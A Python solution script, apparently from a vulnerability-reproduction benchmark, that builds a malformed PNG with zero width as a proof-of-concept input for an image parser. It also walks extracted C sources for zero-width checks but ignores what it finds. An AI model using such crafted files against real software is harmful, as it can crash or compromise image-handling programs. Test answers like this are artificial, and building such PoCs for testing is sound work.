import os
import tempfile
import tarfile
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PNG with zero width or height
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk: width=0, height=1, bit depth=8, color type=2 (RGB)
        ihdr_data = struct.pack('>IIBBBBB', 0, 1, 8, 2, 0, 0, 0)
        ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data)
        ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
        
        # IDAT chunk with minimal compressed data for a 1-pixel row
        # Scanline filter byte + 3 bytes for RGB pixel
        raw_data = b'\x00\x00\x00\x00'
        compressed_data = zlib.compress(raw_data)
        idat_crc = zlib.crc32(b'IDAT' + compressed_data)
        idat_chunk = struct.pack('>I', len(compressed_data)) + b'IDAT' + compressed_data + struct.pack('>I', idat_crc)
        
        # IEND chunk
        iend_crc = zlib.crc32(b'IEND')
        iend_chunk = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
        
        # Combine all chunks
        png_data = png_signature + ihdr_chunk + idat_chunk + iend_chunk
        
        # Check if we can extract more info from source
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Extract to temporary directory
                with tempfile.TemporaryDirectory() as tmpdir:
                    tar.extractall(tmpdir)
                    
                    # Look for test files or patterns that might indicate the exact vulnerability
                    for root, dirs, files in os.walk(tmpdir):
                        for file in files:
                            if file.endswith('.c') or file.endswith('.cc') or file.endswith('.cpp'):
                                filepath = os.path.join(root, file)
                                try:
                                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        # Look for patterns related to zero width/height
                                        if ('width == 0' in content or 'height == 0' in content or 
                                            'width <= 0' in content or 'height <= 0' in content or
                                            'zero width' in content.lower() or 'zero height' in content.lower()):
                                            # Found relevant source, but we'll stick with our generated PNG
                                            # Could adjust based on specific format if found
                                            pass
                                except:
                                    continue
        except:
            # If extraction fails, return our generated PNG
            pass
        
        # Return the PoC - a PNG with zero width
        return png_data
